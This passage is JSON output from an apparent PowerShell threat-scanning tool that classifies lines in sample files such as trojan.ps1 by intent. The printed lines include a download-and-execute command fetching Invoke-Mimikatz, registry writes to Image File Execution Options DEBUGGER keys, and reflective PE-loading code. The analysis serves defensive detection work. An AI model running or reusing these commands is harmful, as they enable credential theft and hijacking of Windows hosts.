                                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nciappo/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"
                            ],
                            "name": "action:Object/New"
                        },
                        {
                            "lines": [
                                "Start-Sleep -Seconds $rndtime",
                                "Start-Sleep -s 900"
                            ],
                            "name": "action:Process/Start"
                        },
                        {
                            "lines": [
                                "$random = get-random -maximum 1000000",
                                "$rndtime = Get-Random -Minimum 1 -Maximum 3"
                            ],
                            "name": "action:Random/Get"
                        },
                        {
                            "lines": [
                                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'BREAKONDLLLOAD' -Va[...]",
                                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'DEBUGGER' -Value $r[...]",
                                "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'BREAKONDLLLOAD' -Va[...]",
                                "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'DEBUGGER' -Value $r[...]"
                            ],
                            "name": "action:Variable/Set"
                        },
                        {
                            "lines": [
                                "(New-Object System.Net.WebClient).DownloadString(\"http://google.com\")",
                                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nciappo/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"
                            ],
                            "name": "observable:command.extrinsic"
                        },
                        {
                            "lines": [
                                "(New-Object System.Net.WebClient).DownloadString(\"http://google.com\")"
                            ],
                            "name": "observable:network.url.http"
                        },
                        {
                            "lines": [
                                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nciappo/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"
                            ],
                            "name": "observable:network.url.https"
                        },
                        {
                            "lines": [
                                "New-Item 'HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -erroraction 'silentlycontinue'",
                                "New-Item 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -erroraction 'silentlycontinue'",
                                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'BREAKONDLLLOAD' -Value $random -Force",
                                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'DEBUGGER' -Value $random -Force",
                                "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'BREAKONDLLLOAD' -Value $random -Force",
                                "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'DEBUGGER' -Value $random -Force"
                            ],
                            "name": "observable:path.registry"
                        }
                    ],
                    "length": 1363,
                    "path": "C:\\Users\\cdaauto\\Desktop\\threatfiles\\threatfiles\\trojan.ps1",
                    "timestamp": "2024-08-01T15:54:04.392Z"
                },
                {
                    "hash": "6B9B31BE1357A884CA92D7EED69769B06E1DF352AA2D3357C01DB7B08763BCF0",
                    "intentions": [
                        {
                            "lines": [
                                "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)",
                                "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs) -ComputerName $ComputerName"
                            ],
                            "name": "action:Command/Invoke"
                        },
                        {
                            "lines": [
                                "$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)",
                                "$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)",
                                "$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])",
                                "$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])",
                                "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
                                "$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)",
                                "$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)",
                                "$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))",
                                "$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))",
                                "$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])",
                                "$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])",
                                "$Parameters = (New-Object Type[](0)),",
                                "$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])",
                                "$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)",
                                "$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))",
                                "$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))",
                                "$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)",
                                "$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)",
                                "$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)",
                                "$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)",
                                "Write-Verbose \"Calling function with WString return type\"",
                                "[...]d-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))",
                                "[...]nedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))",
                                "[...]ntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))",
                                "[...]onHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))",
                                "[...]onHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))",
                                "[...]tr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))",
                                "[...]tr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))",
                                "[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])",
                                "[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])",
                                "[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])",
                                "[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))",
                                "[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])",
                                "[OutputType([Type])]",
                                "[Type[]]",
                                "[Type]",
                                "[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])",
                                "[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)",
                                "[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)",
                                "if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))",
                                "if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)",
                                "if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)"
                            ],
                            "name": "action:Content/Get"
                        },
                        {
                            "lines": [
                                "[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)",
                                "[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)"
                            ],
                            "name": "action:DotNet.Base64/Convert"
                        },
                        {
                            "lines": [
                                "$OSVersion = [Environment]::OSVersion.Version",
                                "if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {"
                            ],
                            "name": "action:DotNet.Environment/Use"
                        },
                        {
                            "lines": [
                                "$HostName = $([System.Net.Dns]::GetHostByName(($env:computerName)).HostName);"
                            ],
                            "name": "action:DotNet.Net.Dns/Resolve"
                        },
                        {
                            "lines": [
                                "$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)",
                                "$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)",
                                "$ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)",
                                "$DllCharacteristicsType = $TypeBuilder.CreateType()",
                                "$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()",
                                "$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()",
                                "$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()",
                                "$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()",
                                "$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()",
                                "$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()",
                                "$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()",
                                "$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()",
                                "$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()",
                                "$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()",
                                "$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()",
                                "$LUID = $TypeBuilder.CreateType()",
                                "$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()",
                                "$MachineType = $TypeBuilder.CreateType()",
                                "$MagicType = $TypeBuilder.CreateType()",
                                "$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)",
                                "$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)",
                                "$SubSystemType = $TypeBuilder.CreateType()",
                                "$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])",
                                "$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)",
                                "$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null",
                                "$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null",
                                "$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null",
                                "$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')",
                                "$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')",
                                "$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')",
                                "($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null",
                                "($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null",
                                "($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null",
                                "($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null",
                                "($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null",
                                "($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null",
                                "($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null",
                                "($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null",
                                "($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null",
                                "($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null",
                                "($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null",
                                "($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null",
                                "($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null",
                                "($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null",
                                "($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null",
                                "($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null",
                                "($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null",
                                "($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null",
                                "($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null",
                                "($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null",
                                "($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null",
                                "($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null",
                                "($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null",
                                "($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null",
                                "($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null",
                                "($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null",
                                "($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null",
                                "($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null",
                                "($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null",
                                "($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null",
                                "($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null",
                                "($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null",
                                "($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null",
                                "($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null",
                                "($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null",
                                "($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null",
                                "($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null",
                                "($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null",
                                "($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null",
                                "($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null",
                                "($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null",
                                "($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null",
                                "($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null",
                                "($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null",
                                "($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null",
                                "($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null",
                                "($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null",
                                "($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null",
                                "($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null",
                                "($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null",
                                "($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null",
                                "($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null",
                                "($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null",
